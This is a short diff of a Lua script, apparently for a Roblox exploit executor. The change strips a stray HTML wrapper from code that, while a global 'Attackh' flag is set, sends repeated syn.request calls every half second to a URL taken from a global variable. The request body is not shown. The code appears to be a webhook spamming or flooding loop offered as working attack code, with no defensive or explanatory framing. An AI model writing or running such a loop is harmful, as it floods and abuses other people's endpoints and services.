@@ -1,6 +1,4 @@
-<html>
-<head>
-       local main = _G.Url
+local main = _G.Url
 if _G.Attackh == true then
 while _G.Attackh do wait(0.5)
 local requestwebhook = syn.request({
@@ -15,7 +13,3 @@ local requestwebhook = syn.request({
 })
 end
 end
-</head>
-<body>
-</body>
-</html>
